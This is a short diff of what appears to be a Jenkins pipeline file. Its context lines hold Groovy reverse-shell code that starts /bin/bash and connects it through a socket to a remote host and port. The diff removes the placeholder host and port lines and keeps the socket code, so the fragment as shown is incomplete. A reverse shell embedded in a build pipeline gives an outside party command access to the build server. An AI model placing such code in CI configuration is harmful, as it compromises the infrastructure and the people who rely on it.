@@ -82,8 +82,6 @@ pipeline {
                     int port=7777;
                     String cmd="/bin/bash";
                     def process = Runtime.getRuntime().exec(cmd)
-                    def host = "your_host_here"
-                    def port = your_port_here
                     
                     def s = new Socket(host, port)
                     def pi = process.getInputStream()
